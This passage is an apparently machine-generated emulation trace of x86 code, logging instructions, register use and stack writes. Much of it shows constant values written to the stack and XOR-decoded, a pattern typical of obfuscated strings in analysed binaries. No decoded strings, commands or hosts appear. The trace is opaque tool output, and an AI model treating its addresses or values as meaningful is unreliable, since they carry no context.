0x8104 for stack size 0x10000 saving data to stack: 7237970109966541168 16 0x46080f: push ecx, regs_read: [30, 22], regs_write: [30] 0x460810: mov ecx, eax, regs_read: [19], regs_write: [22] 0x460817: push dword ptr [esp + 0x164], regs_read: [30], regs_write: [30] 0x460825: push dword ptr [esp + 0x164], regs_read: [30], regs_write: [30] 0x460831: movaps xmm1, xmmword ptr [esp + 0x190], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xec and offset 0x8190 for stack size 0x10000 0x460840: mov dword ptr [esp + 0xf0], 0x50e9e0c7, regs_read: [30], regs_write: () adjusting stack for ESP -0xec and offset 0x80f0 for stack size 0x10000 saving data to stack: 1357504711 4 0x46084b: mov ecx, esi, regs_read: [29], regs_write: [22] 0x46084d: mov dword ptr [esp + 0xf4], 0x350c2281, regs_read: [30], regs_write: () adjusting stack for ESP -0xec and offset 0x80f4 for stack size 0x10000 saving data to stack: 889987713 4 0x460858: mov dword ptr [esp + 0xf8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0xec and offset 0x80f8 for stack size 0x10000 saving data to stack: 929680980 4 0x460863: mov dword ptr [esp + 0xfc], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0xec and offset 0x80fc for stack size 0x10000 saving data to stack: 1389027477 4 0x46086e: pxor xmm1, xmmword ptr [esp + 0xf0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xec and offset 0x80f0 for stack size 0x10000 0x460877: push eax, regs_read: [30, 19], regs_write: [30] 0x460878: movaps xmmword ptr [esp + 0xf4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xf0 and offset 0x80f4 for stack size 0x10000 saving data to stack: 133319729045342163081298197720405835858 16 0x46088e: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x460893: mov dword ptr [esp + 0xe0], 0x50e9e0c7, regs_read: [30], regs_write: () adjusting stack for ESP -0xf0 and offset 0x80e0 for stack size 0x10000 saving data to stack: 1357504711 4 0x46089e: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x4608a3: mov dword ptr [esp + 0xe8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xf0 and offset 0x80e8 for stack size 0x10000 saving data to stack: 929680980 4 0x4608aa: mov dword ptr [esp + 0xec], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xf0 and offset 0x80ec for stack size 0x10000 saving data to stack: 1389027477 4 0x4608b1: mov dword ptr [esp + 0xe4], 0x350c2281, regs_read: [30], regs_write: () adjusting stack for ESP -0xf0 and offset 0x80e4 for stack size 0x10000 saving data to stack: 889987713 4 0x4608bc: movaps xmm1, xmmword ptr [esp + 0xe0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xf0 and offset 0x80e0 for stack size 0x10000 0x4608c4: mov dword ptr [esp + 0x188], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xf0 and offset 0x8188 for stack size 0x10000 saving data to stack: 929680980 4 0x4608cb: mov ecx, esi, regs_read: [29], regs_write: [22] 0x4608cd: mov dword ptr [esp + 0x18c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xf0 and offset 0x818c for stack size 0x10000 saving data to stack: 1389027477 4 0x4608db: mov dword ptr [esp + 0x180], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xf0 and offset 0x8180 for stack size 0x10000 saving data to stack: 914789047 4 0x4608e6: mov dword ptr [esp + 0x184], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0xf0 and offset 0x8184 for stack size 0x10000 saving data to stack: 896093928 4 0x4608f1: pxor xmm1, xmmword ptr [esp + 0x180], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xf0 and offset 0x8180 for stack size 0x10000 0x4608fa: push eax, regs_read: [30, 19], regs_write: [30] 0x4608fb: movaps xmmword ptr [esp + 0xe4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xf4 and offset 0x80e4 for stack size 0x10000 saving data to stack: 28548172593721968 16 0x46090f: push ecx, regs_read: [30, 22], regs_write: [30] 0x460910: mov ecx, eax, regs_read: [19], regs_write: [22] 0x460917: push dword ptr [esp + 0x15c], regs_read: [30], regs_write: [30] 0x460925: push dword ptr [esp + 0x15c], regs_read: [30], regs_write: [30] 0x460949: push 0x10, regs_read: [30], regs_write: [30] 0x46094b: pop eax, regs_read: [30], regs_write: [30, 19] 0x46097e: mov dword ptr [esp + 0x94], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x100 and offset 0x8094 for stack size 0x10000 saving data to stack: 929680980 4 0x4609a3: mov eax, dword ptr [esp + 8], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x100 and offset 0x8008 for stack size 0x10000 0x4609a7: mov ecx, eax, regs_read: [19], regs_write: [22] 0x4609b5: mov ecx, dword ptr [esp + 0x94], regs_read: [30], regs_write: [22] adjusting stack for ESP -0x100 and offset 0x8094 for stack size 0x10000 0x4609be: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x4609c0: mov dword ptr [esp + 0x50], 0x59f2c1bd, regs_read: [30], regs_write: () adjusting stack for ESP -0x100 and offset 0x8050 for stack size 0x10000 saving data to stack: 1509081533 4 0x4609c8: mov dword ptr [esp + 0x54], 0x500e2f9a, regs_read: [30], regs_write: () adjusting stack for ESP -0x100 and offset 0x8054 for stack size 0x10000 saving data to stack: 1343106970 4 0x4609d0: mov dword ptr [esp + 0x58], 0x444cee6e, regs_read: [30], regs_write: () adjusting stack for ESP -0x100 and offset 0x8058 for stack size 0x10000 saving data to stack: 1145892462 4 0x4609d8: mov dword ptr [esp + 0x5c], 0x21efbbb5, regs_read: [30], regs_write: () adjusting stack for ESP -0x100 and offset 0x805c for stack size 0x10000 saving data to stack: 569359285 4 0x4609e0: mov dword ptr [esp + 0x60], 0x205dc154, regs_read: [30], regs_write: () adjusting stack for ESP -0x100 and offset 0x8060 for stack size 0x10000 saving data to stack: 543015252 4 0x4609e8: mov dword ptr [esp + 0x64], 0xa1dfa752, regs_read: [30], regs_write: () adjusting stack for ESP -0x100 and offset 0x8064 for stack size 0x10000 saving data to stack: 2715789138 4 0x4609f0: mov dword ptr [esp + 0x68], 0x4db42015, regs_read: [30], regs_write: () adjusting stack for ESP -0x100 and offset 0x8068 for stack size 0x10000 saving data to stack: 1303650325 4 0x4609f8: mov dword ptr [esp + 0x6c], 0x5f02419c, regs_read: [30], regs_write: () adjusting stack for ESP -0x100 and offset 0x806c for stack size 0x10000 saving data to stack: 1593983388 4 0x460a00: mov dword ptr [esp + 0x70], 0x2998587b, regs_read: [30], regs_write: () adjusting stack for ESP -0x100 and offset 0x8070 for stack size 0x10000 saving data to stack: 697849979 4 0x460a08: mov dword ptr [esp + 0x74], 0x1831374, regs_read: [30], regs_write: () adjusting stack for ESP -0x100 and offset 0x8074 for stack size 0x10000 saving data to stack: 25367412 4 0x460a10: mov dword ptr [esp + 0x78], 0xef7ba0ff, regs_read: [30], regs_write: () adjusting stack for ESP -0x100 and offset 0x8078 for stack size 0x10000 saving data to stack: 4017856767 4 0x460a18: mov dword ptr [esp + 0x7c], 0x5ab361db, regs_read: [30], regs_write: () adjusting stack for ESP -0x100 and offset 0x807c for stack size 0x10000 saving data to stack: 1521705435 4 0x460a20: mov dword ptr [esp + 0x80], 0x495cb5d7, regs_read: [30], regs_write: () adjusting stack for ESP -0x100 and offset 0x8080 for stack size 0x10000 saving data to stack: 1230812631 4 0x460a2b: mov dword ptr [esp + 0x84], 0xa0ce46da, regs_read: [30], regs_write: () adjusting stack for ESP -0x100 and offset 0x8084 for stack size 0x10000 saving data to stack: 2697873114 4 0x460a36: mov dword ptr [esp + 0x88], 0xdbf0b70a, regs_read: [30], regs_write: () adjusting stack for ESP -0x100 and offset 0x8088 for stack size 0x10000 saving data to stack: 3689985802 4 0x460a41: mov dword ptr [esp + 0x8c], 0xfaf5f097, regs_read: [30], regs_write: () adjusting stack for ESP -0x100 and offset 0x808c for stack size 0x10000 saving data to stack: 4210421911 4 0x460a4c: movaps xmm1, xmmword ptr [esp + 0x50], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x100 and offset 0x8050 for stack size 0x10000 0x460a51: push ecx, regs_read: [30, 22], regs_write: [30] 0x460a52: mov dword ptr [esp + 0xa4], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x104 and offset 0x80a4 for stack size 0x10000 saving data to stack: 914789047 4 0x460a5d: mov dword ptr [esp + 0xa8], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x104 and offset 0x80a8 for stack size 0x10000 saving data to stack: 896093928 4 0x460a68: mov dword ptr [esp + 0xac], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x104 and offset 0x80ac for stack size 0x10000 saving data to stack: 929680980 4 0x460a73: mov dword ptr [esp + 0xb0], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0x104 and offset 0x80b0 for stack size 0x10000 saving data to stack: 1389027477 4 0x460a7e: pxor xmm1, xmmword ptr [esp + 0xa4], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x104 and offset 0x80a4 for stack size 0x10000 0x460a87: movaps xmmword ptr [esp + 0x54], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x104 and offset 0x8054 for stack size 0x10000 saving data to stack: 153055182769241905342386770840864969482 16 0x460a8c: movaps xmm1, xmmword ptr [esp + 0x64], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x104 and offset 0x8064 for stack size 0x10000 0x460a91: push edx, regs_read: [30, 24], regs_write: [30] 0x460a92: mov dword ptr [esp + 0xb8], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP -0x108 and offset 0x80b8 for stack size 0x10000 saving data to stack: 1913178889 4 0x460a9d: mov dword ptr [esp + 0xbc], 0x84ff9d1e, regs_read: [30], regs_write: () adjusting stack for ESP -0x108 and offset 0x80bc for stack size 0x10000 saving data to stack: 2231344414 4 0x460aa8: mov dword ptr [esp + 0xc0], 0x22f82a66, regs_read: [30], regs_write: () adjusting stack for ESP -0x108 and offset 0x80c0 for stack size 0x10000 saving data to stack: 586689126 4 0x460ab3: mov dword ptr [esp + 0xc4], 0x656c28fb, regs_read: [30], regs_write: () adjusting stack for ESP -0x108 and offset 0x80c4 for stack size 0x10000 saving data to stack: 1701587195 4 0x460abe: pxor xmm1, xmmword ptr [esp + 0xb8], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x108 and offset 0x80b8 for stack size 0x10000 0x460ac7: movaps xmmword ptr [esp + 0x68], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x108 and offset 0x8068 for stack size 0x10000 saving data to stack: 77668514257917837862356064585796356701 16 0x460acc: movaps xmm1, xmmword ptr [esp + 0x78], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x108 and offset 0x8078 for stack size 0x10000 0x460ad1: push esi, regs_read: [30, 29], regs_write: [30] 0x460ad2: push edi, regs_read: [30, 23], regs_write: [30] 0x460ad3: mov edi, dword ptr [esp + 0x3c], regs_read: [30], regs_write: [23] adjusting stack for ESP -0x110 and offset 0x803c for stack size 0x10000 0x460ad7: mov dword ptr [esp + 0xd0], 0x23eb7d5b, regs_read: [30], regs_write: () adjusting stack for ESP -0x110 and offset 0x80d0 for stack size 0x10000 saving data to stack: 602635611 4 0x460ae2: mov dword ptr [esp + 0xd4], 0x72f07224, regs_read: [30], regs_write: () adjusting stack for ESP -0x110 and offset 0x80d4 for stack size 0x10000 saving data to stack: 1928360484 4 0x460aed: mov dword ptr [esp + 0xd8], 0x8b09cf88, regs_read: [30], regs_write: () adjusting stack for ESP -0x110 and offset 0x80d8 for stack size 0x10000 saving data to stack: 2332675976 4 0x460af8: mov dword ptr [esp + 0xdc], 0x299641e1, regs_read: [30], regs_write: () adjusting stack for ESP -0x110 and offset 0x80dc for stack size 0x10000 saving data to stack: 697713121 4 0x460b03: pxor xmm1, xmmword ptr [esp + 0xd0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x110 and offset 0x80d0 for stack size 0x10000 0x460b0c: push eax, regs_read: [30, 19], regs_write: [30] 0x460b0d: movaps xmmword ptr [esp + 0x84], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x114 and offset 0x8084 for stack size 0x10000 saving data to stack: 153053988162458701598710404867545048352 16 0x460b19: movaps xmm1, xmmword ptr [esp + 0x94], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x114 and offset 0x8094 for stack size 0x10000 0x460b21: mov dword ptr [esp + 0xe4], 0x495cbfdd, regs_read: [30], regs_write: () adjusting stack for ESP -0x114 and offset 0x80e4 for stack size 0x10000 saving data to stack: 1230815197 4 0x460b2c: mov dword ptr [esp + 0xe8], 0xa0ce46da, regs_read: [30], regs_write: () adjusting stack for ESP -0x114 and offset 0x80e8 for stack size 0x10000 saving data to stack: 2697873114 4 0x460b37: mov dword ptr [esp + 0xec], 0xdbf0b70a, regs_read: [30], regs_write: () adjusting stack for ESP -0x114 and offset 0x80ec for stack size 0x10000 saving data to stack: 3689985802 4 0x460b42: mov dword ptr [esp + 0xf0], 0xfaf5f097, regs_read: [30], regs_write: () adjusting stack for ESP -0x114 and offset 0x80f0 for stack size 0x10000 saving data to stack: 4210421911 4 0x460b4d: pxor xmm1, xmmword ptr [esp + 0xe4], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x114 and offset 0x80e4 for stack size 0x10000 0x460b56: push eax, regs_read: [30, 19], regs_write: [30] 0x460b57: push edi, regs_read: [30, 23], regs_write: [30] 0x460b58: movaps xmmword ptr [esp + 0x9c], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x11c and offset 0x809c for stack size 0x10000 saving data to stack: 2570 16 0x460bab: push eax, regs_read: [30, 19], regs_write: [30] 0x460bc9: mov eax, dword ptr [esp + 0xc], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x120 and offset 0x800c for stack size 0x10000 0x460be3: push edi, regs_read: [30, 23], regs_write: [30] 0x460be9: pop ecx, regs_read: [30], regs_write: [30, 22] 0x460bea: mov esi, 0x3769ce54, regs_read: (), regs_write: [29] 0x460bef: mov edx, 0x52cae095, regs_read: (), regs_write: [24] 0x460bf4: mov edi, 0x4f06e0, regs_read: (), regs_write: [23] 0x460bf9: mov eax, dword ptr [0x4f0804], regs_read: (), regs_write: [19] 0x460c0a: mov eax, 0x35694ee8, regs_read: (), regs_write: [19] 0x460c0f: mov dword ptr [esp + 0x3c], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x120 and offset 0x803c for stack size 0x10000 saving data to stack: 1389027477 4 0x460c13: mov dword ptr [esp + 0x34], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x120 and offset 0x8034 for stack size 0x10000 saving data to stack: 896093928 4 0x460c17: mov ecx, 0x368692b7, regs_read: (), regs_write: [22] 0x460c1c: mov dword ptr [esp + 0x30], 0x3686f0c0, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x8030 for stack size 0x10000 saving data to stack: 914813120 4 0x460c24: mov dword ptr [esp + 0x38], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x120 and offset 0x8038 for stack size 0x10000 saving data to stack: 929680980 4 0x460c28: movaps xmm1, xmmword ptr [esp + 0x30], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x120 and offset 0x8030 for stack size 0x10000 0x460c2d: mov dword ptr [esp + 0x40], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x120 and offset 0x8040 for stack size 0x10000 saving data to stack: 914789047 4 0x460c31: mov dword ptr [esp + 0x44], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x120 and offset 0x8044 for stack size 0x10000 saving data to stack: 896093928 4 0x460c35: mov dword ptr [esp + 0x4c], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x120 and offset 0x804c for stack size 0x10000 saving data to stack: 1389027477 4 0x460c39: mov dword ptr [esp + 0x48], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x120 and offset 0x8048 for stack size 0x10000 saving data to stack: 929680980 4 0x460c3d: pxor xmm1, xmmword ptr [esp + 0x40], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x120 and offset 0x8040 for stack size 0x10000 0x460c43: mov dword ptr [esp + 0x1c], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x120 and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x460c47: movaps xmmword ptr [esp + 0x30], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x120 and offset 0x8030 for stack size 0x10000 saving data to stack: 25207 16 0x460c4c: mov dword ptr [esp + 0x10], 0x45eff6eb, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x8010 for stack size 0x10000 saving data to stack: 1173354219 4 0x460c54: mov dword ptr [esp + 0x14], 0x511b218b, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x8014 for stack size 0x10000 saving data to stack: 1360732555 4 0x460c5c: mov dword ptr [esp + 0x18], 0x4311ba7a, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x8018 for stack size 0x10000 saving data to stack: 1125235322 4 0x460c64: movaps xmm1, xmmword ptr [esp + 0x10], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x120 and offset 0x8010 for stack size 0x10000 0x460c69: mov dword ptr [esp + 0x44], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x120 and offset 0x8044 for stack size 0x10000 saving data to stack: 896093928 4 0x460c71: mov dword ptr [esp + 0x40], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x120 and offset 0x8040 for stack size 0x10000 saving data to stack: 914789047 4 0x460c7c: mov dword ptr [esp + 0x4c], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x120 and offset 0x804c for stack size 0x10000 saving data to stack: 1389027477 4 0x460c80: mov edx, 0x4f05f0, regs_read: (), regs_write: [24] 0x460c85: mov dword ptr [esp + 0x48], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x120 and offset 0x8048 for stack size 0x10000 saving data to stack: 929680980 4 0x460c89: pxor xmm1, xmmword ptr [esp + 0x40], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x120 and offset 0x8040 for stack size 0x10000 0x460c8f: push eax, regs_read: [30, 19], regs_write: [30] 0x460c90: movaps xmmword ptr [esp + 0x14], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x124 and offset 0x8014 for stack size 0x10000 saving data to stack: 36045880887929993766590047324 16 0x460c9a: pop ecx, regs_read: [30], regs_write: [30, 22] 0x460ca1: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x460ca7: push ecx, regs_read: [30, 22], regs_write: [30] 0x460ca8: push eax, regs_read: [30, 19], regs_write: [30] 0x460cae: pop ecx, regs_read: [30], regs_write: [30, 22] 0x460caf: pop ecx, regs_read: [30], regs_write: [30, 22] 0x460cb7: mov esi, eax, regs_read: [19], regs_write: [29] 0x460cd4: push edi, regs_read: [30, 23], regs_write: [30] 0x460cd5: push esi, regs_read: [30, 29], regs_write: [30] 0x460cdb: mov eax, dword ptr [0x4f0804], regs_read: (), regs_write: [19] 0x460ce2: pop ecx, regs_read: [30], regs_write: [30, 22] 0x460ce3: pop ecx, regs_read: [30], regs_write: [30, 22] 0x460ce4: mov ecx, dword ptr [0x4f0800], regs_read: (), regs_write: [22] 0x460ced: mov dword ptr [esp + 8], 0x60, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x8008 for stack size 0x10000 saving data to stack: 96 4 0x460d01: mov eax, edi, regs_read: [23], regs_write: [19] 0x460d03: mov dword ptr [esp + 0xc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x120 and offset 0x800c for stack size 0x10000 saving data to stack: 896093928 4 0x460d12: mov edx, dword ptr [edx], regs_read: [24], regs_write: [24] 0x460d18: mov dword ptr [esp + 0x2c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x120 and offset 0x802c for stack size 0x10000 saving data to stack: 896093928 4 0x460d1e: mov ecx, dword ptr [eax], regs_read: [19], regs_write: [22] 0x460d20: mov dword ptr [esp + 0x2c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x120 and offset 0x802c for stack size 0x10000 saving data to stack: 914789047 4 0x460d2d: mov ecx, dword ptr [ecx], regs_read: [22], regs_write: [22] 0x460d38: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x460d3a: mov dword ptr [esp + 0x50], 0x59f2c1bd, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x8050 for stack size 0x10000 saving data to stack: 1509081533 4 0x460d42: mov dword ptr [esp + 0x54], 0x500e2f9a, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x8054 for stack size 0x10000 saving data to stack: 1343106970 4 0x460d4a: mov dword ptr [esp + 0x58], 0x444cee6e, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x8058 for stack size 0x10000 saving data to stack: 1145892462 4 0x460d52: mov dword ptr [esp + 0x5c], 0x37b9b59f, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x805c for stack size 0x10000 saving data to stack: 934917535 4 0x460d5a: mov dword ptr [esp + 0x60], 0x1f69857b, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x8060 for stack size 0x10000 saving data to stack: 527009147 4 0x460d62: mov dword ptr [esp + 0x64], 0xa1dfa77b, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x8064 for stack size 0x10000 saving data to stack: 2715789179 4 0x460d6a: mov dword ptr [esp + 0x68], 0xfbd2015, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x8068 for stack size 0x10000 saving data to stack: 264052757 4 0x460d72: mov dword ptr [esp + 0x6c], 0x292569b6, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x806c for stack size 0x10000 saving data to stack: 690317750 4 0x460d7a: mov dword ptr [esp + 0x70], 0x50ce5d61, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x8070 for stack size 0x10000 saving data to stack: 1355701601 4 0x460d82: mov dword ptr [esp + 0x74], 0x199f262e, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x8074 for stack size 0x10000 saving data to stack: 429860398 4 0x460d8a: mov dword ptr [esp + 0x78], 0xab33a1ed, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x8078 for stack size 0x10000 saving data to stack: 2872287725 4 0x460d92: mov dword ptr [esp + 0x7c], 0x239c32c4, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x807c for stack size 0x10000 saving data to stack: 597439172 4 0x460d9a: mov dword ptr [esp + 0x80], 0x495cbfdd, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x8080 for stack size 0x10000 saving data to stack: 1230815197 4 0x460da5: mov dword ptr [esp + 0x84], 0xa0ce46da, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x8084 for stack size 0x10000 saving data to stack: 2697873114 4 0x460db0: mov dword ptr [esp + 0x88], 0xdbf0b70a, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x8088 for stack size 0x10000 saving data to stack: 3689985802 4 0x460dbb: mov dword ptr [esp + 0x8c], 0xfaf5f097, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x808c for stack size 0x10000 saving data to stack: 4210421911 4 0x460dc6: mov dword ptr [esp + 0xa0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x80a0 for stack size 0x10000 saving data to stack: 914789047 4 0x460dd1: mov dword ptr [esp + 0xa4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x80a4 for stack size 0x10000 saving data to stack: 896093928 4 0x460ddc: mov dword ptr [esp + 0xa8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x80a8 for stack size 0x10000 saving data to stack: 929680980 4 0x460de7: mov dword ptr [esp + 0xac], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0x120 and offset 0x80ac for stack size 0x10000 saving data to stack: 1389027477 4 0x460df2: movaps xmm1, xmmword ptr [esp + 0xa0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x120 and offset 0x80a0 for stack size 0x10000 0x460dfa: pxor xmm1, xmmword ptr [esp + 0x50], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x120 and offset 0x8050 for stack size 0x10000 0x460e00: movaps xmmword ptr [esp + 0x50], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x120 and offset 0x8050 for stack size 0x10000 saving data to stack: 134850866545741602452920879969144689418 16 0x460e05: movaps xmm1, xmmword ptr [esp + 0x60], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x120 and offset 0x8060 for stack size 0x10000 0x460e0a: push edx, regs_read: [30, 24], regs_write: [30] 0x460e0b: push dword ptr [esp + 0x30], regs_read: [30], regs_write: [30] 0x460e0f: mov dword ptr [esp + 0xb8], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP -0x128 and offset 0x80b8 for stack size 0x10000 saving data to stack: 1913178889 4 0x460e1a: mov dword ptr [esp + 0xbc], 0x84ff9d1e, regs_read: [30], regs_write: () adjusting stack for ESP -0x128 and offset 0x80bc for stack size 0x10000 saving data to stack: 2231344414 4 0x460e25: mov dword ptr [esp + 0xc0], 0x22f82a66, regs_read: [30], regs_write: () adjusting stack for ESP -0x128 and offset 0x80c0 for stack size 0x10000 saving data to stack: 586689126 4 0x460e30: mov dword ptr [esp + 0xc4], 0x656c28fb, regs_read: [30], regs_write: () adjusting stack for ESP -0x128 and offset 0x80c4 for stack size 0x10000 saving data to stack: 1701587195 4 0x460e3b: pxor xmm1, xmmword ptr [esp + 0xb8], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x128 and offset 0x80b8 for stack size 0x10000 0x460e44: movaps xmmword ptr [esp + 0x68], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x128 and offset 0x8068 for stack size 0x10000 saving data to stack: 101401689821529690385733151152236744306 16 0x460e49: movaps xmm1, xmmword ptr [esp + 0x78], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x128 and offset 0x8078 for stack size 0x10000 0x460e4e: push ecx, regs_read: [30, 22], regs_write: [30] 0x460e4f: mov dword ptr [esp + 0xcc], 0x23eb7d5b, regs_read: [30], regs_write: () adjusting stack for ESP -0x12c and offset 0x80cc for stack size 0x10000 saving data to stack: 602635611 4 0x460e5a: mov dword ptr [esp + 0xd0], 0x72f07224, regs_read: [30], regs_write: () adjusting stack for ESP -0x12c and offset 0x80d0 for stack size 0x10000 saving data to stack: 1928360484 4 0x460e65: mov dword ptr [esp + 0xd4], 0x8b09cf88, regs_read: [30], regs_write: () adjusting stack for ESP -0x12c and offset 0x80d4 for stack size 0x10000 saving data to stack: 2332675976 4 0x460e70: mov dword ptr [esp + 0xd8], 0x299641e1, regs_read: [30], regs_write: () adjusting stack for ESP -0x12c and offset 0x80d8 for stack size 0x10000 saving data to stack: 697713121 4 0x460e7b: pxor xmm1, xmmword ptr [esp + 0xcc], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x12c and offset 0x80cc for stack size 0x10000 0x460e84: push eax, regs_read: [30, 19], regs_write: [30] 0x460e85: movaps xmmword ptr [esp + 0x80], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x130 and offset 0x8080 for stack size 0x10000 saving data to stack: 13346538344955099318199076946415263802 16 0x460e91: movaps xmm1, xmmword ptr [esp + 0x90], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x130 and offset 0x8090 for stack size 0x10000 0x460e99: mov dword ptr [esp + 0xe0], 0x495cbfdd, regs_read: [30], regs_write: () adjusting stack for ESP -0x130 and offset 0x80e0 for stack size 0x10000 saving data to stack: 1230815197 4 0x460ea4: mov dword ptr [esp + 0xe4], 0xa0ce46da, regs_read: [30], regs_write: () adjusting stack for ESP -0x130 and offset 0x80e4 for stack size 0x10000 saving data to stack: 2697873114 4 0x460eaf: mov dword ptr [esp + 0xe8], 0xdbf0b70a, regs_read: [30], regs_write: () adjusting stack for ESP -0x130 and offset 0x80e8 for stack size 0x10000 saving data to stack: 3689985802 4 0x460eba: mov dword ptr [esp + 0xec], 0xfaf5f097, regs_read: [30], regs_write: () adjusting stack for ESP -0x130 and offset 0x80ec for stack size 0x10000 saving data to stack: 4210421911 4 0x460ec5: pxor xmm1, xmmword ptr [esp + 0xe0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x130 and offset 0x80e0 for stack size 0x10000 0x460ece: push eax, regs_read: [30, 19], regs_write: [30] 0x460ecf: push esi, regs_read: [30, 29], regs_write: [30] 0x460ed0: movaps xmmword ptr [esp + 0x98], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x8098 for stack size 0x10000 saving data to stack: 0 16 0x460edd: mov eax, dword ptr [esp + 0x20], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x8020 for stack size 0x10000 0x460ee9: mov eax, dword ptr [0x4f0804], regs_read: (), regs_write: [19] 0x460eee: mov ecx, dword ptr [0x4f0800], regs_read: (), regs_write: [22] 0x460efd: mov eax, dword ptr [esp + 0xc], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x800c for stack size 0x10000 0x460f07: push esi, regs_read: [30, 29], regs_write: [30] 0x460f0d: pop ecx, regs_read: [30], regs_write: 